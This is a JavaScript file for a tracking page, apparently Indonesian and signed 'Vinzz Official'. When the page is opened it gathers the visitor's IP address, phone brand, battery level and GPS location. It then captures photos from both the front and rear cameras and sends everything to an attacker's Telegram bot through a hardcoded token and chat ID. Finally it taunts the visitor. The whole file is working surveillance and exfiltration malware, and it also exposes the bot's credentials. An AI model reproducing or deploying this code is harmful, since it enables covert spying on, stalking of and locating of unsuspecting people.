const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
const chat_id = '7777604508';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "Tidak diketahui";
  }
}

function getMerekHP() {
  const ua = navigator.userAgent;
if (/Samsung|SM-|GT-/i.test(ua)) return "Samsung";
if (/Xiaomi|Mi |MIX|M\d{4}/i.test(ua)) return "Xiaomi";
if (/Redmi|Note \d+/i.test(ua)) return "Redmi";
if (/Oppo|CPH|PAM|PCLM|PGM/i.test(ua)) return "Oppo";
if (/Vivo|V\d{4}|PD\d{4}/i.test(ua)) return "Vivo";
if (/Realme|RMX|RMX\d+/i.test(ua)) return "Realme";
if (/iPhone|iPad|iOS/i.test(ua)) return "Apple";
if (/Asus|Zenfone|ZS\d{4}/i.test(ua)) return "Asus";
if (/Infinix|X\d{3}/i.test(ua)) return "Infinix";
if (/Huawei|Honor|JAT|LYA|ELE|NOH|LIO/i.test(ua)) return "Huawei";
if (/OnePlus|KB\d{4}|GM\d{4}|IN\d{4}/i.test(ua)) return "OnePlus";
if (/Lenovo|L\d{4}/i.test(ua)) return "Lenovo";
if (/Motorola|Moto|XT\d{4}/i.test(ua)) return "Motorola";
if (/Tecno|KG\d{4}|CD\d{4}/i.test(ua)) return "Tecno";
if (/Itel|W\d{4}/i.test(ua)) return "Itel";
if (/Nokia|TA-\d{4}/i.test(ua)) return "Nokia";
if (/Sony|Xperia|G\d{4}/i.test(ua)) return "Sony";
if (/Meizu/i.test(ua)) return "Meizu";
if (/ZTE|Z\d{4}/i.test(ua)) return "ZTE";
if (/HTC/i.test(ua)) return "HTC";
if (/Sharp|SHV/i.test(ua)) return "Sharp";
if (/LG|LM-|LGM/i.test(ua)) return "LG";
if (/Coolpad|CP\d{4}/i.test(ua)) return "Coolpad";
if (/Micromax/i.test(ua)) return "Micromax";
if (/Alcatel|TCL/i.test(ua)) return "Alcatel";
if (/BlackBerry|BB\d{4}/i.test(ua)) return "BlackBerry";
if (/LeEco|LeMobile/i.test(ua)) return "LeEco";
if (/Doogee/i.test(ua)) return "Doogee";
if (/Ulefone/i.test(ua)) return "Ulefone";
if (/BLU/i.test(ua)) return "BLU";
if (/Cubot/i.test(ua)) return "Cubot";
if (/RealWear/i.test(ua)) return "RealWear";
if (/Fairphone/i.test(ua)) return "Fairphone";
if (/BQ/i.test(ua)) return "BQ";
if (/Hisense/i.test(ua)) return "Hisense";
  return "Tidak diketahui";
}

async function getBatteryInfo() {
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      const persen = Math.round(battery.level * 100);
      const charging = battery.charging ? "🔌 Charging" : "🔋 Tidak charging";
      return `${persen}% (${charging})`;
    } else {
      return "Tidak tersedia";
    }
  } catch {
    return "Tidak diketahui";
  }
};

async function captureCamera(facing) {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } })
      .then(stream => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => {
              resolve(blob);
            }, 'image/jpeg');
          }, 2000);
        };
      })
      .catch(err => reject(err));
  });
}

async function kirimFotoKeTelegram() {
  try {
    const frontBlob = await captureCamera('user');
    const backBlob = await captureCamera('environment');

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('media', JSON.stringify([
      { type: "photo", media: "attach://depan", caption: "📷 Kamera Depan" },
      { type: "photo", media: "attach://belakang", caption: "📷 Kamera Belakang" }
    ]));
    formData.append('depan', frontBlob, 'depan.jpg');
    formData.append('belakang', backBlob, 'belakang.jpg');

    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
      method: 'POST',
      body: formData
    });

  } catch (err) {
    await kirimPesanTelegram("Gagal mengirim foto: akses kamera di tolak");
  }
}

async function kirimPesanTelegram(pesan) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chat_id,
      text: pesan
    })
  });
}

(async () => {
  const batre = await getBatteryInfo();
  const ip = await getIP();
  const merek = getMerekHP();
  const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENUNGGU IZIN LOKASI
│📡 IP: ${ip}
│🔋 Batrai: ${batre}
│📱 Merek hp: ${merek}
╰───────────────────`;
  await kirimPesanTelegram(pesanAwal);
})();

navigator.geolocation.getCurrentPosition(
  async (pos) => {
    const batre = await getBatteryInfo();
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENGIZINKAN LOKASI
│📡 IP: ${ip}
│📱 Merek hp: ${merek}
│🔋 Batrai: ${batre}
│📍 Lokasi: ${gmaps}
│📷 Sedang meminta akses kamera...
╰───────────────────`;
    await kirimPesanTelegram(pesan);
    await kirimFotoKeTelegram();
    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  },
  async () => {
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENOLAK LOKASI
│📡 IP: ${ip}
│🔋 Batrai: ${batre}
│📱 Merek hp: ${merek}
│📷 Sedang meminta akses kamera...
╰───────────────────`;
    await kirimPesanTelegram(pesan);
    await kirimFotoKeTelegram();
    document.body.innerHTML = '<h2>Izinin dulu semuanya<br><small>by Vinzz Official</small></h2>';
  }
);
